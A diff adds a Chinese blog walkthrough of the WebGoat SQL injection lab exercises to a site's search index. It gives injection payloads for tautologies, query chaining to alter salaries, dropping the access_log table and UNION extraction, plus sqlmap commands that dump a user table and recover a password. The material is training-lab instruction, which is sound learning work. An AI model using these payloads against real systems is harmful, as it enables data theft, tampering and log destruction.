@@ -1,6 +1,114 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>WebGoat Injection 解题思路 （一）</title>
+    <url>/zh-CN/3dea2b22/</url>
+    <content><![CDATA[<h1 id="WebGoat-版本信息"><a href="#WebGoat-版本信息" class="headerlink" title="WebGoat 版本信息"></a>WebGoat 版本信息</h1><ul>
+<li>WebGoat v8.1.0</li>
+</ul>
+<h1 id="A1-Injection-注入"><a href="#A1-Injection-注入" class="headerlink" title="(A1) Injection 注入"></a>(A1) Injection 注入</h1><h2 id="SQL-Injection-intro"><a href="#SQL-Injection-intro" class="headerlink" title="SQL Injection (intro)"></a>SQL Injection (intro)</h2><h3 id="1-Concept"><a href="#1-Concept" class="headerlink" title="1 - Concept"></a>1 - Concept</h3><p>介绍SQL的基本概念，仔细阅读即可。</p>
+<h3 id="2-What-is-SQL"><a href="#2-What-is-SQL" class="headerlink" title="2 - What is SQL?"></a>2 - What is SQL?</h3><p>简单了解SQL语句。测试如何使用 <strong>SELECT语句</strong>进行查询。<br>这个非常简单：</p>
+<figure class="highlight cs"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> department <span class="keyword">from</span> employees <span class="keyword">where</span> userid=<span class="number">96134</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-DML"><a href="#3-DML" class="headerlink" title="3 - DML"></a>3 - DML</h3><p>SQL语句除去SELECT查询之外，还有Insert, Update等添加、修改数据的操作。</p>
+<p>测试内容为将<code>Tobi Barnett</code>的部门修改为<code>Sales</code>。这个也相对容易：</p>
+<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Update</span> employees <span class="keyword">set</span> department = <span class="string">'Sales'</span> <span class="keyword">where</span> userid = <span class="number">89762</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4-DDL"><a href="#4-DDL" class="headerlink" title="4 - DDL"></a>4 - DDL</h3><p>这一节介绍了如何使用SQL语句修改数据库中表的结构。测试内容是为<code>employees</code>表添加一个名为<code>phone</code>的列，数据类型为<code>varchar(20)</code>。</p>
+<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> employees <span class="keyword">ADD</span> phone <span class="type">varchar</span>(<span class="number">20</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-DCL"><a href="#5-DCL" class="headerlink" title="5 - DCL"></a>5 - DCL</h3><p>这一节的内容是通过SQL语言管理用户进入及操作数据库的权限。</p>
+<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="keyword">TO</span> UnauthorizedUser</span><br></pre></td></tr></table></figure>
+
+<p>到此为止，就完成了对于SQL语句的初步认识与学习。如果对于SQL语言的其他操作还存在什么问题的话，可以在<a href="https://www.w3schools.com/sql/default.asp" target="_blank" rel="noopener">w3school SQL</a>进行学习。</p>
+<h3 id="6-amp-7-amp-8-What-is-SQL-injection"><a href="#6-amp-7-amp-8-What-is-SQL-injection" class="headerlink" title="6 &amp; 7 &amp; 8 - What is SQL injection?"></a>6 &amp; 7 &amp; 8 - What is SQL injection?</h3><p>这几节介绍了SQL注入的基本原理，可能产生的影响以及SQL注入的严重性。如果之前对于 <strong>SQL注入</strong> 已经有了基本的了解，那么这一步可以简单跳过。 如果对于 <strong>SQL注入</strong> 还没有任何的概念，请务必仔细阅读这里的内容。</p>
+<p>这三节没有任何交互性的内容。</p>
+<h3 id="9-Try-It"><a href="#9-Try-It" class="headerlink" title="9 - Try It!"></a>9 - Try It!</h3><p>最最基本的注入结构。明文测试来感受一下如何构造一个成功的SQL注入语句。</p>
+<p><img data-src="/zh-CN/3dea2b22/1_1_9.png" alt="Try It!"></p>
+<h3 id="10-Numeric-SQL-Injection"><a href="#10-Numeric-SQL-Injection" class="headerlink" title="10 - Numeric SQL Injection"></a>10 - Numeric SQL Injection</h3><p>稍微提高了一些难度。SQL语句从页面接受了两个不同的用户输入，但是其中只有一个可以成功进行SQL注入。我们需要找到正确的输入域，并利用。</p>
+<p>先简单尝试：<br><img data-src="/zh-CN/3dea2b22/1_1_10.png" alt="10"></p>
+<p>看到了错误提示为： 无法成功将Login_Count的值解析为数字。</p>
+<p>所以再次尝试对User_id的值进行注入：</p>
+<p><img data-src="/zh-CN/3dea2b22/1_1_10_1.png" alt="Success!"></p>
+<h3 id="11-String-SQL-Injection"><a href="#11-String-SQL-Injection" class="headerlink" title="11 - String SQL Injection"></a>11 - String SQL Injection</h3><p>类似于第9个小测试的内容。只不过这次不再是选择题了。在<code>Employee Name</code>的输入框输入：</p>
+<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">' or <span class="number">1</span>=<span class="number">1</span> --</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/zh-CN/3dea2b22/1_1_11.png" alt></p>
+<h3 id="12-Compromising-Integrity-with-Query-chaining"><a href="#12-Compromising-Integrity-with-Query-chaining" class="headerlink" title="12 - Compromising Integrity with Query chaining"></a>12 - Compromising Integrity with Query chaining</h3><p>同样的输入框。但这次不同于之前的仅仅是获取到全部员工的列表信息，这次我们需要真真切切地做些坏事了。这个挑战的要求是，将数据库中自己的工资修改为最高。</p>
+<p>思路是使用分号分隔两句SQL语句，并在第二句使用UPDATE命令对数据进行更新。因此，我们可以在<code>Employee Name</code>的输入框输入：</p>
+<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">' or <span class="number">1</span>=<span class="number">1</span>; Update employees SET SALARY=<span class="number">99999</span> where AUTH_TAN=<span class="number">3</span>SL99A --</span><br></pre></td></tr></table></figure>
+
+<p>OK,顺利让自己的工资变成最高了！！（千万别在真实的生产环境中做同样的事情！！）</p>
+<p><img data-src="/zh-CN/3dea2b22/1_1_11.png" alt></p>
+<h3 id="13-Compromising-Availability"><a href="#13-Compromising-Availability" class="headerlink" title="13 - Compromising Availability"></a>13 - Compromising Availability</h3><p>题目要求在<code>access_log</code>表中删除被系统记录下的SQL语句执行记录。</p>
+<p>与上一题思路相同，再第二句SQL语句中执行 <strong>DROP</strong> 命令，删除<code>access_log</code>表中的数据。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">d'; <span class="keyword">drop</span> <span class="keyword">TABLE</span> access_log <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p>成功！</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这一小节介绍了SQL注入中一些最为基础的概念。并通过一个比较真实的场景，来展现了一个攻击者在面对一个存在漏洞的系统时，可以实现哪些操作。</p>
+<p>当然，由于这一部分主要是面对刚刚入门的初学者，为了更好的实现展示的目的，所以这一部分中的漏洞非常的显而易见，也非常容易利用。而在实际的生产环境中，大多数的漏洞并不是那么简单地就能被利用。下一节就要尝试更困难的挑战了！</p>
+<h2 id="SQL-Injection-advanced"><a href="#SQL-Injection-advanced" class="headerlink" title="SQL Injection (advanced)"></a>SQL Injection (advanced)</h2><h3 id="1-2"><a href="#1-2" class="headerlink" title="1,2"></a>1,2</h3><p>这两节简单得介绍了SQL注入实操的一些基本技巧。这些技巧其实非常有用，虽然我们可以使用SQL Map这类的工具来帮助我们完成一些自动化的SQL注入操作，但是对于基本原理的理解可以让你最大化发挥出工具的价值。</p>
+<h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p>这里需要通过SQL注入获取数据库中表的完整信息，而且这次我们已经不满足于获得当前的数据表。我们还需要同时获取另一张表中的内容。这里我们可以使用<code>UNION SELECT</code>语句来实现两张表的数据拼接：</p>
+<p><code>d&#39; and 1=2 UNION SELECT user_system_data.*,NULL,NULL,NULL from user_system_data --</code></p>
+<p>这里需要注意的有两点：  </p>
+<ul>
+<li>使用UNION SELECT 需要前后两张表的列数相匹配。由于题目中已知的信息告诉我们<code>user_system_data</code>中只有4列数据，所以我们需要手动填充3列<code>NULL</code>。</li>
+<li>一开始写的是<code>UNION SELECT *</code>,结果可以看到报错为: <code>duplicate column name in derived table</code>。不难理解，两张表中都有<code>userid</code>列，而第二张表的<code>userid</code>还是主键。所以我们需要在<code>*</code>前指定表名。</li>
+</ul>
+<p><img data-src="/zh-CN/3dea2b22/1_2_3.png" alt></p>
+<p>根据正确答案提示，这道题还可以直接拼接SQL语句。这个实现起来就更简单了：</p>
+<p><code>d&#39;; SELECT * from user_system_data</code> </p>
+<p><img data-src="/zh-CN/3dea2b22/1_2_3_1.png" alt></p>
+<p>输入Dave的密码： <code>passW0rD</code> 最终完成。 </p>
+<h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p>这边介绍了SqL盲注。之前的挑战中，页面上会返回完整的信息，包括了数据库的报错信息还有完整的查询结果。但在现实的环境中，大多数的情况是，数据库仅会返回查询是成功还是失败。在这种情况下，我们每次可以从数据库获得的信息会大大减少，这也很大程度增加了注入的难度。</p>
+<p>这一节的说明简要解释了两种最常见的盲注方法： <strong>基于内容的盲注</strong> 和 <strong>基于时间的盲注</strong> </p>
+<h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p>来吧，亲自尝试一下！！</p>
+<p>这里我们看到了一个最为常见的功能：登录与注册。我们需要最终以Tom的身份登录进系统。</p>
+<p><img data-src="/zh-CN/3dea2b22/1_2_5.png" alt></p>
+<p>简单尝试使用SQL注入绕过登录，发现失败了。然后尝试在Register功能中注入。</p>
+<p><img data-src="/zh-CN/3dea2b22/1_2_5_1.png" alt></p>
+<p>可以看到系统会返回说用户已经存在的消息。尝试简单修改用户名，快速检验是否存在注入的可能：</p>
+<p><code>tom&#39; and 1=1 --</code></p>
+<p>系统返回了以下信息：</p>
+<figure class="highlight puppet"><table><tr><td class="code"><pre><span class="line"><span class="keyword">User</span> &#123;<span class="number">0</span>&#125; <span class="keyword">already</span> <span class="keyword">exists</span> <span class="keyword">please</span> <span class="keyword">try</span> <span class="keyword">to</span> <span class="keyword">register</span> <span class="keyword">with</span> <span class="keyword">a</span> <span class="keyword">different</span> <span class="keyword">username</span>.</span><br></pre></td></tr></table></figure>
+
+<p>这个<code>{0}</code>看着颇为可疑…感觉可能是个能够利用的点。使用BurpSuite截取请求：</p>
+<p><img data-src="/zh-CN/3dea2b22/1_2_5_2.png" alt></p>
+<p>将请求保存到本地文件，并使用<code>sqlmap -r webgoat_1.2.5_register.txt</code>对这个请求进行SQL注入的测试。</p>
+<p><img data-src="/zh-CN/3dea2b22/1_2_5_3.png" alt></p>
+<p>很显然，<code>username_reg</code>这个参数存在SQL注入的漏洞。因此，我们进一步利用 <strong>SQL Map</strong> 来通过这个注入点，获取更多数据库信息。基于上一次运行的结果，我们使用下列命令来列出数据库中所有的DB列表：</p>
+<figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="comment">sqlmap</span> <span class="literal">-</span><span class="comment">r</span> <span class="comment">webgoat_1</span><span class="string">.</span><span class="comment">2</span><span class="string">.</span><span class="comment">5_register</span><span class="string">.</span><span class="comment">txt</span> --<span class="comment">dbms=HSQLDB</span> --<span class="comment">thread</span> <span class="comment">5</span> --<span class="comment">dbs</span> --<span class="comment">no</span><span class="literal">-</span><span class="comment">cast</span> --<span class="comment">technique=B</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/zh-CN/3dea2b22/1_2_5_4.png" alt></p>
+<p>我们获取到了5个数据库。再指定数据库为<code>PUBLIC</code>获取该数据中所有的表名。同时我们注意到，这个时候执行的速度明显减慢了很多，所以我们可以在参数中加入<code>--string=&quot;already exists please try to register with a different username&quot;</code>指定查询为真的条件。</p>
+<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">sqlmap -r webgoat_1.2.5_register.txt <span class="params">--string=</span><span class="string">"already exists please try to register with a different username"</span> <span class="params">--dbms=HSQLDB</span> <span class="params">--thread</span> 10 <span class="params">--technique=B</span> -D PUBLIC <span class="params">--tables</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/zh-CN/3dea2b22/1_2_5_5.png" alt></p>
+<p>成功获取到所有的表名。其中<code>SQL_CHALLENGE_USERS</code>看着就非常像我们需要获取信息的表。尝试直接下载这张表里的内容：</p>
+<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">sqlmap -r webgoat_1.2.5_register.txt <span class="params">--string=</span><span class="string">"already exists please try to register with a different username"</span> <span class="params">--dbms=HSQLDB</span> <span class="params">--thread</span> 10 <span class="params">--technique=B</span> -D PUBLIC -T SQL_CHALLENGE_USERS <span class="params">--dump</span></span><br></pre></td></tr></table></figure>
+
+<p>运行的时候才发现，这个数据库居然还是有快200行…那直接dump确实有点暴力了…(大笑)。有不少是运行SQLMap的时候自己注册进去的!!所以我们采用一个更有针对性的方法：</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">sqlmap -r webgoat_1.2.5_register.txt <span class="attribute">--string</span>=<span class="string">"already exists please try to register with a different username"</span> <span class="attribute">--dbms</span>=HSQLDB --thread 10 <span class="attribute">--technique</span>=B -D PUBLIC -T SQL_CHALLENGE_USERS <span class="attribute">--sql-query</span>=<span class="string">"SELECT userid,password FROM SQL_CHALLENGE_USERS WHERE USERID='tom'"</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/zh-CN/3dea2b22/1_2_6.png" alt></p>
+<p>顺利获得密码！登录即可。</p>
+<blockquote>
+<p>当然，这道题同样可以在password参数中爆破出密码，这里只是给出了一种完全使用SQLMap的思路。</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Security</category>
+        <category>Web Application</category>
+      </categories>
+      <tags>
+        <tag>Pentest</tag>
+        <tag>WebGoat</tag>
+        <tag>OWASP Top10</tag>
+        <tag>SQLMap</tag>
+        <tag>SQL Injection</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>WebGoat安装运行步骤</title>
     <url>/zh-CN/a0ebb04/</url>
     <content><![CDATA[<p>WebGoat 是一个由OWASP开发和维护的，专为网络应用安全教学所设计的网络应用靶机。 WebGoat中包含了常见的OWASP Top10漏洞的训练页面。对于有意掌握网络应用安全及渗透测试相关技术的用户来说，这是个非常有效的工具。</p>
